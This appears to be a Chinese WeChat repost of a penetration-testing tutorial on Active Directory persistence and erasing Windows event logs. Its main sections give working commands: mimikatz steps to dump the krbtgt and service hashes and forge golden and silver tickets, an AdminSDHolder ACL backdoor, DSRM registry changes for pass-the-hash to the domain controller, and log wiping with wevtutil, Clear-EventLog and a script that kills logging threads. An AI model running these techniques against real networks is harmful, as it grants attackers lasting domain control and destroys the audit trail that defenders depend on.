##  内网渗透｜域内持久化与Windows日志删除

[ 渗透Xiao白帽 ](javascript:void\(0\);)

**渗透Xiao白帽** ![]()

微信号 SuPejkj

功能介绍 积硅步以致千里，积怠惰以致深渊！

____

__

收录于话题

以下文章来源于HACK学习呀 ，作者11ccaab

![HACK学习呀](http://wx.qlogo.cn/mmhead/Q3auHgzwzM40Ey25ia7icKDtM0hyhYQeTnJdaC9NzZRHPkFM71EAD3Fw/0)
**HACK学习呀**

HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

# 0x01 金票

可以使用krbtgt的NTLM hash创建作为任何用户的有效TGT。要伪造黄金票据的前提是知道域的SID和krbtgt账户的hash或者AES-256值。

## 1.1 收集krbtgt密码信息

    
    
    privilege::debuglsadump::lsa /inject /name:krbtgt

![](https://gitee.com/fuli009/images/raw/master/public/20210816192534.png)

得到krbtgt的hash：

    
    
    c73caed3bc6f0a248e51d37b9a8675fa

域sid值：

    
    
    S-1-5-21-151877218-3666268517-4145415712

## 1.2 金票利用

使用mimikatz伪造kerberos票证

 **生成gold.kribi**

    
    
     mimikatz "kerberos::golden /domain:redteam.local /sid:S-1-5-21-151877218-3666268517-4145415712/krbtgt:c73caed3bc6f0a248e51d37b9a8675fa /user:administrator/ticket:gold.kirbi"

![](https://gitee.com/fuli009/images/raw/master/public/20210816192535.png)

可以看到没有任何票证。

 **导入gold.kribi**

    
    
     kerberos::ptt C:\Users\jack\Desktop\gold.kirbi

![]()

成功导入administrator票据。

![](https://gitee.com/fuli009/images/raw/master/public/20210816192536.png)

可以通过事件管理器查看到是以administrator来登录的

![](https://gitee.com/fuli009/images/raw/master/public/20210816192537.png)

# 0x02 银票

如果我们拥有服务的hash，就可以给自己签发任意用户的TGS票据。金票是伪造TGT可用于访问任何Kerberos服务，而银票是伪造TGS，仅限于访问针对特定服务器的任何服务。

这里使用CIFS服务，该服务是windows机器之间的文件共享。

## 2.1 获取sid

    
    
    whoami /user

![]()

## 2.2 导出服务账号的NTLM Hash

    
    
    privilege::Debugsekurlsa::logonpasswords

![](https://gitee.com/fuli009/images/raw/master/public/20210816192538.png)

## 2.3 创建银票

![](https://gitee.com/fuli009/images/raw/master/public/20210816192539.png)

    
    
    kerberos::golden /domain:redteam.local/sid:S-1-5-21-151877218-3666268517-4145415712/target:DC.redteam.local/service:cifs /rc4:0703759771e4bed877ecd472c95693a5/user:administrator /ptt

![](https://gitee.com/fuli009/images/raw/master/public/20210816192540.png)

psexec获取DC机器cmd

![](https://gitee.com/fuli009/images/raw/master/public/20210816192541.png)

# 0x03 AdminSDHolder组

AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护AD账户和组的模板，当我们获取到域控权限，就可以通过授予该用户对容器进行滥用，使该用户成为域管。

默认情况下，该组的 ACL 被复制到所有“受保护组”中。这样做是为了避免有意或无意地更改这些关键组。但是，如果攻击者修改了AdminSDHolder组的
ACL，例如授予普通用户完全权限，则该用户将拥有受保护组内所有组的完全权限（在一小时内）。如果有人试图在一小时或更短的时间内从域管理员中删除此用户（例如），该用户将回到组中。

    
    
    在server2000中引入，默认包含如下的组：AdministratorsDomainAdminsAccountOperatorsBackupOperatorsDomainControllersEnterpriseAdminsPrintOperatorsReplicatorRead-only DomainControllersSchemaAdminsServerOperators

其中Administrators、Domain Admins、Enterprise
Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和组的具备admincount属性值为1的特征。

![](https://gitee.com/fuli009/images/raw/master/public/20210816192542.png)

## 3.1 使用powerview查询

查询ad保护的域的用户

    
    
    Get-NetUser-AdminCount|select samaccountname

![](https://gitee.com/fuli009/images/raw/master/public/20210816192543.png)

查询域中受ad保护的所有组

    
    
    Get-netgroup -AdminCount| select name

![](https://gitee.com/fuli009/images/raw/master/public/20210816192544.png)

## 3.2 使用ActiveDirectory

查询ad保护的域中所有的用户和组

    
    
    Import-ModuleActiveDirectoryGet-ADObject-LDAPFilter"(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))"|select name

![]()

## 3.3 添加用户

添加jack用户对其有完全控制权限。

    
    
    Add-DomainObjectAcl-TargetIdentityAdminSDHolder-PrincipalIdentity jack -RightsAll

然后验证下，这里的sid为jack用户的。

    
    
    Get-DomainObjectAcl adminsdholder | ?{$_.SecurityIdentifier-match "S-1-5-21-151877218-3666268517-4145415712-1106"} | select objectdn,ActiveDirectoryRights |sort -Unique

![](https://gitee.com/fuli009/images/raw/master/public/20210816192545.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192546.png)

默认会等待60分钟，可以通过修改注册表来设置为60秒后触发。

    
    
    reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 1/f

![]()

## 3.4 恢复

恢复触发时间

    
    
    reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 120/f

取消jack用户对adminSDHolder的权限

    
    
    Remove-DomainObjectAcl-TargetSearchBase"LDAP://CN=AdminSDHolder,CN=System,DC=redteam,DC=local"-PrincipalIdentity jack -RightsAll-Verbose

![](https://gitee.com/fuli009/images/raw/master/public/20210816192547.png)

# 0x04 DSRM凭证

每个DC内部都有一个本地管理员账户，在该机器上拥有管理员权限。

## 4.1 获取本地管理员hash

    
    
    token::elevatelsadump::sam

![](https://gitee.com/fuli009/images/raw/master/public/20210816192547.png)

得到hash为：

    
    
    852a844adfce18f66009b4f14e0a98de

## 4.2 检查是否工作

如果注册表项的值为0或者不存在，需要将其设置为2。

检查key是否存在并且获取值：

    
    
    Get-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior

如果不存在则创建值为2的键：

    
    
    New-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2-PropertyType DWORD

如果存在但是不为2设置为2：

    
    
    Set-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2

![](https://gitee.com/fuli009/images/raw/master/public/20210816192549.png)

## 4.3 PTH域控

    
    
    sekurlsa::pth /domain:DC /user:Administrator/ntlm:852a844adfce18f66009b4f14e0a98de/run:powershell.exe

![]()

# 0x05 规避Windows 事件日志记录

在做完一些渗透测试清理痕迹是很有必要的一个环节，包括在一些渗透还未结束也要清理掉一些操作日志。在情报收集反溯源等等大多都是采用windows事件日志中。

## 5.1 查看windows日志

### 5.1.1 事件管理器

![](https://gitee.com/fuli009/images/raw/master/public/20210816192550.png)

### 5.1.2 powershell

  

管理员权限运行查看安全类别的日志：

    
    
    Get-WinEvent-FilterHashtable@{logname="security";}

![](https://gitee.com/fuli009/images/raw/master/public/20210816192551.png)

## 5.2 windows日志清除方法

### 5.2.1 wevtutil.exe

 **统计日志列表数目信息等：**

    
    
     wevtutil.exe gli Applicationwevtutil.exe gli Security

![](https://gitee.com/fuli009/images/raw/master/public/20210816192552.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192553.png)

 **查询指定类别的(这里以security举例):**

    
    
     wevtutil qe Security/f:text

![](https://gitee.com/fuli009/images/raw/master/public/20210816192554.png)

 **删除指定类别：**

    
    
     wevtutil cl security

  

原本大量日志信息

![](https://gitee.com/fuli009/images/raw/master/public/20210816192555.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192556.png)![]()

但是会留下一个事件id为1102的日志清除日志

### 5.2.2 powershell清除日志

 **查看指定事件id：**

    
    
     Get-EventLogSecurity-InstanceId4624,4625

![](https://gitee.com/fuli009/images/raw/master/public/20210816192557.png)

 **删除指定类别日志：**

    
    
     Clear-EventLog-LogNameSecurity

![](https://gitee.com/fuli009/images/raw/master/public/20210816192558.png)

### 5.2.3 Phantom脚本

该脚本可以让日志功能失效，无法记录。他会遍历日志进程的线程堆栈来终止日志服务线程。

添加一个用户可以看到产生了日志

![](https://gitee.com/fuli009/images/raw/master/public/20210816192559.png)

我们再给删除

![](https://gitee.com/fuli009/images/raw/master/public/20210816192600.png)

运行ps1脚本：

![](https://gitee.com/fuli009/images/raw/master/public/20210816192601.png)

再次添加用户查看日志：

![](https://gitee.com/fuli009/images/raw/master/public/20210816192602.png)

 **![]()**

 ** **【往期推荐】****  

[
【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-Shellcode
Loader原理(python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-
分离+混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-
python命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  

[【超详细 | 附EXP】Weblogic CVE-2021-2394
RCE漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 |
Weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附PoC】CVE-2021-2109 | Weblogic
Server远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server
远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附PoC】用友NC
BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

##
[【奇淫巧技】如何成为一个合格的“FOFA”工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)

[记一次HW实战笔记 |
艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange
远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

 _
**走过路过的大佬们留个关注再走呗**_![](https://gitee.com/fuli009/images/raw/master/public/20210816192603.png)

 **往期文章有彩蛋哦** **![]()**  

![](https://gitee.com/fuli009/images/raw/master/public/20210816192604.png)

一如既往的学习，一如既往的整理，一如即往的分享。![]()  

“ **如侵权请私聊公众号删文** ”

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

内网渗透｜域内持久化与Windows日志删除

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

